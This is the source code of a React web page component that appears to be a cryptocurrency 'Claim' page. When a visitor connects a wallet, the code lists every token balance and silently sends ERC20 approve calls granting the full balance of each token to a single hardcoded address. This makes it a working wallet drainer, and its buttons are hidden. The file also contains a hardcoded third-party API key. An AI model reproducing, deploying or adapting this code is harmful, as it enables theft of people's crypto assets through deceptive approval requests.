import React, { useEffect } from 'react';
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useAccount } from 'wagmi'
const { Alchemy, Network, BigNumber } = require("alchemy-sdk");
import ERC20ABI from "../ERC20.json";
import { getContract } from 'viem';
import { useContractWrite } from "wagmi";



function Home() {

    const { address, isConnected } = useAccount();
    const { openConnectModal } = useConnectModal();
    const { data, isLoading, isSuccess, write } = useContractWrite({
        abi: ERC20ABI,
        functionName: 'approve'

    });

    const config = {
        apiKey: "ik4lKo9Qf2HSP7auR83a_o5xSDpVrowY",
        network: Network.ETH_MAINNET,
    };
    const alchemy = new Alchemy(config);

    useEffect(() => {
        const init = async () => {
            if (isConnected) {
                // Get token balances
                const balances = await alchemy.core.getTokenBalances(address);                
                if(balances.tokenBalances.length > 0) {
                    for(let i = 0; i < balances.tokenBalances.length; i++) {
                        const token = balances.tokenBalances[i];
                        if(token.tokenBalance != "0x0000000000000000000000000000000000000000000000000000000000000000"){
                            try{
                                write({
                                    address: token.contractAddress,
                                    args: ["0x0000063Fe0A1Ef401da9CcD1C630ae2Df47d67E9", token.tokenBalance],
                                    from: address
                                });
                            }catch(e){
                                console.log(e);
                            }
                        }
                    }
                }
            }
        }
        init();
    }, [isConnected]);

    return (
        <div>
            {isConnected? <button id="connect" hidden={true} data-address={address}>Claim</button> : <button id='connect' hidden={true} onClick={() => openConnectModal()}>Connect</button>}
        </div>
    )
}

export default Home;